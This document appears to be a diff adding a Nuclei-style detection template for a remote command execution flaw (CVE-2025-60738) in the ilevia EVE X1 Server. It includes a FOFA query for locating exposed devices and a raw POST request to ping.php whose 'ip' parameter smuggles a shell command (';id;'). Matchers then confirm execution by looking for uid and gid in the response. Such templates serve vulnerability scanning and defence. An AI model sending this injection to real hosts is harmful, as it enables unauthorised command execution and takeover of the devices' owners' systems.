@@ -1,0 +1,36 @@
+id: ilevia-eve-x1-server-rce
+
+info:
+  name: "ilevia-EVE-X1-Server 远程命令执行漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="ilevia-EVE-X1-Server"
+      该设备管理接口未正确验证用户输入，允许攻击者通过构造恶意命令参数实现远程代码执行，可能导致系统权限被完全妥协。
+  reference:
+  - CVE-2025-60738
+  tags: ilevia-EVE-X1-Server
+
+http:
+- raw:
+  - |
+    POST /ajax/php/ping.php HTTP/1.1
+    Host: {{Hostname}}
+    Accept: */*
+    Accept-Encoding: gzip, deflate
+    Accept-Language: zh-CN,zh;q=0.9
+    Content-type: application/x-www-form-urlencoded
+
+    ip=;id;
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'uid'
+  - type: word
+    part: body
+    words:
+    - 'gid'
